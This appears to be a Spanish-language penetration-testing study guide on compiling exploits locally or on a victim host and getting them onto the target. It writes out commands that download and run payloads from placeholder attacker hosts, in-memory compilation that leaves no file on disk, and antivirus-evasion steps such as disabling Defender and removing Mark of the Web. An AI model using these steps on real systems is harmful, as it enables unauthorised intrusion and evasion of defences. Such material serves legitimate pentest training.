> Objetivo: tener un proceso repetible para cuando el exploit que necesitas **no** está precompilado en `C:\Tools` (o no existe equivalente en Linux), y tienes que compilarlo tú mismo desde código fuente, en tu máquina de ataque o directamente en el objetivo.

---

## 1. Antes de compilar: información que necesitas reunir

No tiene sentido compilar a ciegas. Antes de tocar un compilador, recopila esto del objetivo:

|Dato|Por qué importa|Cómo lo obtienes|
|---|---|---|
|**Arquitectura** (x86 / x64 / ARM)|Un binario x64 no corre en un SO x86 y viceversa|Windows: `wmic os get osarchitecture` o `echo %PROCESSOR_ARCHITECTURE%`. PowerShell: `[Environment]::Is64BitOperatingSystem`. Linux: `uname -m`, `lscpu`|
|**Versión y build del SO**|Algunos exploits (kernel, DLL hijacking) son version-specific|Windows: `systeminfo`, `[System.Environment]::OSVersion`, `ver`. Linux: `uname -a`, `cat /etc/os-release`, `lsb_release -a`|
|**Versión de .NET Framework instalada** (si vas a compilar C#)|Determina si existe `csc.exe` y qué sintaxis/APIs soporta|`reg query "HKLM\SOFTWARE\Microsoft\NET Framework Setup\NDP" /s` o ver carpetas en `C:\Windows\Microsoft.NET\Framework\`|
|**Privilegios actuales**|Define si puedes escribir en ciertas rutas, instalar nada, o si necesitas evadir restricciones|`whoami /priv`, `whoami /groups`|
|**AV/EDR presente y su estado**|Decide si necesitas evasión, ofuscación o compilar in-situ|`Get-MpComputerStatus` (Defender), `tasklist` buscando procesos de AV de terceros, `sc query windefend`|
|**Execution Policy / restricciones de PowerShell**|Puede bloquear scripts aunque el binario esté bien|`Get-ExecutionPolicy -List`|
|**Conectividad de red disponible** (qué puertos salen)|Determina qué método de transferencia usar|`Test-NetConnection -ComputerName <IP> -Port <puerto>`, o simplemente intentar|
|**Herramientas ya presentes en el objetivo**|A veces no necesitas subir nada (LOLBins)|Revisa `C:\Windows\Microsoft.NET\Framework\*\csc.exe`, `where curl`, `where certutil`|

**Checklist mental rápido antes de compilar:**

1. ¿Para qué SO/arquitectura compilo?
2. ¿Tengo el código fuente correcto (versión correcta del PoC, rama correcta)?
3. ¿Voy a compilar en mi Kali o directamente en la víctima?
4. ¿Hay AV activo que me obligue a evadir?
5. ¿Cómo voy a transferir el resultado si compilo en local?

---

## 2. Compilar en LOCAL (tu máquina de ataque) y subir

### 2.1 C / C++ → ejecutable Windows desde Kali (cross-compiling con MinGW)

```bash
# Instalar el toolchain (una vez)
sudo apt update && sudo apt install -y mingw-w64

# Compilar para 64 bits
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -lws2_32

# Compilar para 32 bits (si el objetivo es x86)
i686-w64-mingw32-gcc exploit.c -o exploit32.exe -lws2_32

# Compilación estática (evita depender de DLLs del objetivo)
x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static -lws2_32
```

`-lws2_32` es habitual en PoCs que usan sockets de Windows (Winsock). Revisa el `#include` del código fuente para saber qué librerías enlazar (`-lws2_32`, `-luser32`, `-ladvapi32`, etc.).

### 2.2 C# → .exe desde Kali (sin tener Windows)

```bash
sudo apt install -y mono-mcs
mcs exploit.cs -out:exploit.exe
```

Si el PoC usa namespaces/APIs muy específicas de .NET Framework moderno, Mono a veces falla. En ese caso, mejor compílalo en una VM Windows con `csc.exe` o Visual Studio Build Tools.

### 2.3 C# → .exe usando `csc.exe` (en una máquina Windows propia o víctima)

```cmd
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:exploit.exe exploit.cs
```

Para 64 bits usa la ruta `Framework64`:

```cmd
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\csc.exe /out:exploit.exe exploit.cs
```

### 2.4 Transferir el binario compilado al objetivo

**Desde Kali hacia Windows víctima:**

```bash
# 1. Servir el archivo
python3 -m http.server 8080
# o, más sigiloso para evadir firmas de tráfico:
impacket-smbserver share . -smb2support
```

```powershell
# 2. Descargar en la víctima (PowerShell)
iwr -uri http://<IP_ATACANTE>:8080/exploit.exe -outfile C:\Windows\Temp\exploit.exe

# Alternativa con certutil (LOLBin nativo, no necesita PowerShell)
certutil.exe -urlcache -split -f http://<IP_ATACANTE>:8080/exploit.exe exploit.exe

# Alternativa vía SMB (sin abrir HTTP)
copy \\<IP_ATACANTE>\share\exploit.exe C:\Windows\Temp\exploit.exe
```

**Desde Kali hacia Linux víctima:**

```bash
# En la víctima
wget http://<IP_ATACANTE>:8080/exploit -O /tmp/exploit
chmod +x /tmp/exploit
# o
curl http://<IP_ATACANTE>:8080/exploit -o /tmp/exploit
```

**Si no hay salida HTTP/SMB (firewall restrictivo):** transfiere en Base64 copiando y pegando por una shell ya existente (ver sección de problemas más abajo).

---

## 3. Compilar EN REMOTO (directamente en la máquina víctima)

Esta técnica evita subir un `.exe` ya compilado (que puede detectar el AV por firma/hash) y en su lugar subes solo el código fuente, que es texto plano y mucho menos sospechoso.

### 3.1 Compilar C# in-situ con `csc.exe`

```cmd
:: 1. Sube solo el .cs (texto, no ejecutable)
iwr -uri http://<IP>:8080/exploit.cs -outfile C:\Windows\Temp\exploit.cs

:: 2. Compila localmente en la víctima
C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /out:C:\Windows\Temp\exploit.exe C:\Windows\Temp\exploit.cs

:: 3. Ejecuta
C:\Windows\Temp\exploit.exe
```

### 3.2 Compilar inline con PowerShell `Add-Type` (sin tocar disco con un .exe)

```powershell
$code = (iwr -uri http://<IP>:8080/exploit.cs).Content
Add-Type -TypeDefinition $code -Language CSharp
[NombreNamespace.NombreClase]::Metodo()
```

Esto compila en memoria usando el mismo `csc.exe` por debajo, pero sin que nunca exista un `.exe` en disco — más difícil de detectar por AV basado en archivos.

### 3.3 Compilar C/C++ in-situ (menos común, pero posible)

Windows no trae `gcc` por defecto, así que esta vía normalmente solo aplica si:

- El objetivo ya tiene MinGW/MSYS2 instalado, o
- Estás en un objetivo Linux con `gcc` disponible (muy típico): sube el `.c`, compila con `gcc exploit.c -o exploit`.

---

## 4. ¿Compilar en local o en remoto? Cuándo usar cada uno

|Situación|Recomendado|
|---|---|
|AV/Defender activo y agresivo|Compilar en remoto (subes solo código fuente)|
|Necesitas probar varias veces / iterar rápido|Compilar en local, vas más rápido|
|El objetivo no tiene compilador (`csc.exe` no existe, sin `gcc`)|Compilar en local y transferir el binario|
|Quieres evitar dejar artefactos `.exe` en disco|`Add-Type` inline o compilar y ejecutar en memoria|
|Arquitectura del objetivo incierta|Compila ambas (x86 y x64) en local antes de subir nada|

---

## 5. Problemas comunes (well-known) y cómo solucionarlos

### 5.1 Defender/AV borra o detecta el binario al subirlo

**Síntoma:** el archivo desaparece justo después de transferirse, o `certutil`/`iwr` falla sin motivo aparente.

**Soluciones:**

- Compila tú mismo el código (cambia el hash respecto al binario "conocido" que ya tiene firma en VirusTotal).
- Compila **en remoto** (sube solo el `.cs`/`.c`, no el `.exe`).
- Renombra strings/funciones obvias en el código fuente antes de compilar (cambia nombres de variables, quita comentarios delatores) para evitar detección heurística básica.
- Comprime el binario en un `.zip` con contraseña antes de transferirlo; Defender no suele escanear dentro de archivos cifrados.
- Como último recurso, si ya tienes shell con privilegios suficientes: `Set-MpPreference -DisableRealtimeMonitoring $true` (solo en laboratorio/CTF, nunca en un pentest real sin autorización explícita).

### 5.2 Error de arquitectura: "no es una aplicación Win32 válida" / "exec format error"

**Síntoma:** intentas ejecutar el binario y Windows/Linux lo rechaza directamente.

**Soluciones:**

- Verifica arquitectura del objetivo **antes** de compilar (`wmic os get osarchitecture` / `uname -m`).
- En MinGW, compila ambas versiones por seguridad: `x86_64-w64-mingw32-gcc` (64-bit) e `i686-w64-mingw32-gcc` (32-bit).
- En C#, recuerda que el IL de .NET normalmente es "Any CPU" por defecto y corre en ambas arquitecturas — el problema de arquitectura es mucho más común en C/C++ nativo.

### 5.3 `csc.exe` no existe o la versión de .NET es insuficiente para el código

**Síntoma:** `'csc.exe' is not recognized`, o errores de sintaxis al compilar features de C# modernas (ej. `async`, pattern matching) que esa versión de .NET no soporta.

**Soluciones:**

- Busca todas las versiones instaladas: `dir /s /b C:\Windows\Microsoft.NET\Framework*\csc.exe`.
- Si solo hay .NET Framework 2.0/3.5, reescribe el PoC con sintaxis más antigua (sin LINQ, sin `var`, sin `async/await`).
- Si no hay ningún `csc.exe`, compílalo en tu propia máquina (local) con la versión de .NET que necesites y sube el `.exe` ya compilado en vez de intentar compilar in-situ.

### 5.4 Faltan dependencias / DLLs al ejecutar el binario ("no se puede iniciar la aplicación porque falta X.dll")

**Síntoma:** el `.exe` compila bien en tu Kali pero falla al ejecutarse en la víctima.

**Soluciones:**

- Compila estático para que no dependa de DLLs externas del sistema objetivo:
    
    ```bash
    x86_64-w64-mingw32-gcc exploit.c -o exploit.exe -static -lws2_32
    ```
    
- Si el error es por el Visual C++ Redistributable, evita compilar con MSVC y usa MinGW, que enlaza de forma más portable.
- Revisa con `ldd` (en Linux) o herramientas como `Dependencies` (Windows) qué librerías pide tu binario antes de subirlo.

### 5.5 El archivo llega corrupto o incompleto tras la transferencia

**Síntoma:** el binario subido no se ejecuta, o el tamaño en la víctima no coincide con el original.

**Soluciones:**

- Verifica integridad con hash antes y después: `certutil -hashfile exploit.exe SHA256` (Windows) / `sha256sum exploit.exe` (Linux/Kali).
- Si usaste `copy`/`paste` en una consola con límite de buffer, transfiere en Base64 por partes en vez de todo de golpe:
    
    ```bash
    # En Kali: generar el base64base64 -w 0 exploit.exe > exploit.b64
    ```
    
    ```powershell
    # En la víctima: reconstruir[IO.File]::WriteAllBytes("C:\Windows\Temp\exploit.exe", [Convert]::FromBase64String($texto_pegado))
    ```
    
- Prefiere protocolos binarios fiables (SMB, FTP) en vez de copiar/pegar texto cuando el archivo es grande.

### 5.6 PowerShell bloquea la ejecución (Execution Policy / Mark of the Web)

**Síntoma:** `... cannot be loaded because running scripts is disabled on this system`, o el `.exe`/`.ps1` descargado de internet pide confirmación o se bloquea por la "Zona de Internet".

**Soluciones:**

- Bypass de política de ejecución solo para ese proceso:
    
    ```powershell
    powershell -ExecutionPolicy Bypass -File script.ps1
    ```
    
- Quitar el "Mark of the Web" (Zone.Identifier) del archivo descargado:
    
    ```powershell
    Unblock-File -Path C:\Windows\Temp\exploit.exe
    ```
    
- O directamente elimina el stream alternativo:
    
    ```powershell
    Remove-Item C:\Windows\Temp\exploit.exe -Stream Zone.Identifier
    ```
    

### 5.7 No hay salida a internet desde la víctima (firewall restrictivo, sin HTTP/SMB)

**Síntoma:** `iwr`, `certutil`, `wget` fallan por timeout; no hay ruta de salida.

**Soluciones:**

- Comprueba qué puertos salientes están realmente abiertos antes de asumir que no hay ninguno: `Test-NetConnection -ComputerName <IP> -Port 443/80/445/53`.
- Si tienes ya una shell interactiva (aunque sea limitada), usa copy/paste en Base64 (ver 5.5) como último recurso.
- Prueba DNS exfil/transfer si solo el puerto 53 está abierto (más avanzado, raro en CPTS pero existe).
- Considera montar un servidor en un puerto "permitido" típico (80, 443, 53) en lugar del puerto por defecto de tu herramienta.

---

## 6. Tabla de referencia rápida de comandos

|Acción|Windows|Linux|
|---|---|---|
|Ver arquitectura|`wmic os get osarchitecture`|`uname -m`|
|Ver versión de SO|`systeminfo`|`cat /etc/os-release`|
|Descargar archivo|`iwr -uri <url> -outfile <archivo>` o `certutil -urlcache -split -f <url> <archivo>`|`wget <url> -O <archivo>` / `curl <url> -o <archivo>`|
|Servir archivos (atacante)|`python3 -m http.server 8080`|`python3 -m http.server 8080`|
|Compilar C/C++ (cross, desde Kali)|`x86_64-w64-mingw32-gcc f.c -o f.exe`|`gcc f.c -o f`|
|Compilar C# (en Windows)|`csc.exe /out:f.exe f.cs`|—|
|Compilar C# (cross, desde Kali)|`mcs f.cs -out:f.exe`|`mcs f.cs -out:f`|
|Hash de verificación|`certutil -hashfile f.exe SHA256`|`sha256sum f`|
|Quitar Mark of the Web|`Unblock-File -Path f.exe`|—|
|Compartir por SMB|`impacket-smbserver share . -smb2support` (desde Kali)|—|

---

## 7. Checklist final antes de dar por bueno un exploit compilado

- [ ] Confirmé arquitectura (x86/x64) del objetivo
- [ ] Confirmé versión de SO / .NET Framework si aplica
- [ ] Decidí compilar en local o en remoto según presencia de AV
- [ ] Verifiqué el hash del archivo tras transferirlo
- [ ] Probé ejecución y, si falla, revisé dependencias/DLLs
- [ ] Si PowerShell bloquea la ejecución, aplico `Unblock-File` o `-ExecutionPolicy Bypass`
- [ ] Tengo un método de transferencia alternativo (Base64/SMB) por si el principal (HTTP) falla